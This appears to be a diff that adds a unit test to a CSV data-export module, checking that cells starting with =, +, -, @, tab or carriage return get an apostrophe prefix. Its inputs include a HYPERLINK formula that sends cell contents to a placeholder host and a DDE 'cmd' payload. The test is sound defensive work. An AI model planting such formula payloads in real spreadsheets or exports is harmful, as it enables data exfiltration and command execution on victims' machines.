@@ -11,6 +11,18 @@ describe("CSV de la descarga de datos (F-044)", () => {
     expect(csvRow(["a", 1, null])).toBe("a;1;\r\n");
   });
 
+  it("sin inyección de fórmulas: apóstrofo delante de =, +, -, @, tabulador y retorno", () => {
+    expect(csvCell('=HYPERLINK("http://x/?d="&E2&F2;"Proveedor SL")')).toBe(`"'=HYPERLINK(""http://x/?d=""&E2&F2;""Proveedor SL"")"`);
+    expect(csvCell("+34-1")).toBe("'+34-1");
+    expect(csvCell("-2+3+cmd|' /C calc'!A0")).toBe("'-2+3+cmd|' /C calc'!A0");
+    expect(csvCell("@SUM(A1)")).toBe("'@SUM(A1)");
+    expect(csvCell("\tx")).toBe("'\tx");
+    expect(csvCell("\rx")).toBe(`"'\rx"`);
+    // Un número plano sigue siendo un número.
+    expect(csvCell("-12,50")).toBe("-12,50");
+    expect(csvCell("-3")).toBe("-3");
+  });
+
   it("importes con coma y fechas AAAA-MM-DD", () => {
     expect(csvAmount({ toString: () => "1234.56" })).toBe("1234,56");
     expect(csvAmount(null)).toBe("");
